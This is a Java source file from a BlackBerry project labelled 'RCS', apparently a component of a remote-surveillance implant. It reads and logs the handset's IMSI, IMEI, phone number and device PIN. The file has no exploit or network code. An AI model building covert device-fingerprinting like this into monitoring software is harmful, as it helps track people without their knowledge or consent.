//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : Device.java
 * Created      : 26-mar-2010
 * *************************************************/

package blackberry;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.SIMCardException;
import net.rim.device.api.system.SIMCardInfo;
import net.rim.device.api.util.NumberUtilities;
import blackberry.interfaces.Singleton;
import blackberry.utils.Check;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

// TODO: Auto-generated Javadoc
/**
 * The Class Device.
 */
public final class Device implements Singleton {

    /** The debug instance. */
    //#ifdef DEBUG
    private static Debug debug = new Debug("Device", DebugLevel.VERBOSE);
    //#endif

    public static final int VERSION = 2010033101;
    public static final String SUBTYPE = "BLACKBERRY";

    /** The imei. */
    byte[] imei = new byte[0];

    /** The imsi. */
    byte[] imsi = new byte[0];

    /** The phone number. */
    String phoneNumber = "";

    /** The instance. */
    private static Device instance = null;

    /**
     * Gets the single instance of Device.
     * 
     * @return single instance of Device
     */
    public static synchronized Device getInstance() {
        if (instance == null) {
            instance = new Device();
        }

        return instance;
    }

    /**
     * Gets the subtype.
     * 
     * @return the subtype
     */
    public static byte[] getSubtype() {

        return SUBTYPE.getBytes();
    }

    /**
     * Gets the version.
     * 
     * @return the version
     */
    public static byte[] getVersion() {
        final byte[] versionRet = Utils.intToByteArray(VERSION);
        //#ifdef DBC
        Check.ensures(versionRet.length == 4, "Wrong version len");
        //#endif
        return versionRet;
    }

    /**
     * Instantiates a new device.
     */
    private Device() {
    }

    /**
     * Clear.
     */
    public void clear() {

        imsi = new byte[0];
        imei = new byte[0];
        phoneNumber = "";
        return;
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public String getImei() {

        //#ifdef DBC
        Check.ensures(imei != null, "null imei");
        //#endif
        return Utils.imeiToString(imei);
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public String getImsi() {
        return Utils.imeiToString(imsi);
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public String getPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        //#endif
        return phoneNumber;
    }

    /**
     * Gets the imei.
     * 
     * @return the imei
     */
    public byte[] getWImei() {

        //#ifdef DBC
        Check.ensures(imei != null, "null imei");
        //#endif
        return WChar.getBytes(Utils.imeiToString(imei));
    }

    /**
     * Gets the imsi.
     * 
     * @return the imsi
     */
    public byte[] getWImsi() {
        return WChar.getBytes(Utils.imeiToString(imsi));
    }

    /**
     * Gets the phone number.
     * 
     * @return the phone number
     */
    public byte[] getWPhoneNumber() {
        //#ifdef DBC
        Check.ensures(phoneNumber != null, "null phoneNumber");
        //#endif
        final byte[] encoded = WChar.getBytes(phoneNumber);
        return encoded;
    }

    /**
     * Refresh data.
     */
    public void refreshData() {
        //#ifdef DEBUG_INFO
        debug.info("PIN: " + getPin());
        //#endif

        try {
            imsi = SIMCardInfo.getIMSI();
            //#ifdef DEBUG_INFO
            debug.info("IMSI: " + Utils.imeiToString(imsi));
            //#endif
        } catch (final SIMCardException e) {
            //#ifdef DEBUG
            debug.warn("no sim detected");
            //#endif
        }

        imei = GPRSInfo.getIMEI();
        //#ifdef DEBUG_INFO
        debug.info("IMEI: " + Utils.imeiToString(imei));
        //#endif

        phoneNumber = Phone.getDevicePhoneNumber(true);
        if (phoneNumber == null) {
            phoneNumber = "UNKNOWN";
        }
        //#ifdef DEBUG_INFO
        debug.info("Phone Number: " + phoneNumber);
        //#endif
    }

    public static String getPin() {

        return NumberUtilities.toString(DeviceInfo.getDeviceId(), 16);
    }

}
